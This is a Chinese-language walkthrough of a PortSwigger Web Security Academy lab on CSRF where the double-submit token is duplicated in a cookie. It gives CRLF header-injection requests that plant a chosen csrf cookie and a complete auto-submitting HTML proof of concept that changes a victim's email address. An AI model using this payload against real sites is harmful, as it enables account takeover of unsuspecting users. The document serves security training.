# 实验：Token 在 Cookie 中重复的 CSRF 漏洞

https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie

本实验的邮箱修改功能易受 CSRF 攻击。它试图使用不安全的“双重提交”（double submit）CSRF 防御技术。

为了解决本实验，请使用你的漏洞利用服务器（exploit server）托管一个 HTML 页面，该页面利用 CSRF 攻击修改查看者的邮箱地址。

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **提示**
> 你无法注册已被其他用户使用的邮箱地址。如果在测试利用程序时更改了自己的邮箱地址，请确保在向受害者交付最终利用程序时使用另一个不同的邮箱地址。

## 步骤

探测搜索功能
- 使用搜索功能
    ```http
    GET /?search=%60%21%22%23%24%25%26%27%28%29*%2B%2C-.%2F%3A%3B%3C%3D%3E%3F%40%5B%5D%5E_%60%7B%7D%7C%7E%5C%5C HTTP/2
    ```

    - 服务器响应
        ```http
        Set-Cookie: LastSearchTerm=`!"#$%&'()*+,-./:;<=>?@[]^_`{}|~\\; Secure; HttpOnly
        ```
        - 输入在响应头部反射，且特殊字符未被转义
    
- 测试头部注入
    ```http
    GET /?search=foooo%0d%0aSet-Cookie:%20csrf=abcde;%20SameSite=None HTTP/2
    ```

    - 服务器响应
        ```http
        Set-Cookie: LastSearchTerm=foooo
        Set-Cookie: csrf=abcde; SameSite=None; Secure; HttpOnly
        ```
        - 注入响应头部以设置 cookie 成功

探测邮件修改功能
- 使用邮件修改功能

    ```http
    POST /my-account/change-email HTTP/2
    Cookie: LastSearchTerm=`!"#$%&'()*+,-./:; csrf=Jd2Y51ZgUPcMUJM02SCIMfx5WUqRSsfJ; session=hOuMc7RbMcDgHeteJOTfJBge9oEODeWJ

    email=a%40b&csrf=Jd2Y51ZgUPcMUJM02SCIMfx5WUqRSsfJ
    ```
    - 双重 csrf 令牌在 cookie 与请求体参数中使用相同值

- 尝试删除参数
    - 失败
- 尝试同时修改两个令牌为任意值
    - 成功，仅需确保值相同，无格式检查

攻击
- 设置两个 csrf 令牌值相同：搜索功能的头部注入所设置的 cookie csrf 令牌与表单的参数 csrf 令牌值相同

    ```html
    <html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>

        <img src="https://lab-id.web-security-academy.net/?search=foooo%0d%0aSet-Cookie:%20csrf=abcde;%20SameSite=None" onerror="document.forms[0].submit();">

        <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="aaaaa&#64;b" />
            <input type="hidden" name="csrf" value="abcde" />
            <input type="submit" value="Submit request" />
        </form>

    </body>
    </html>
    ```
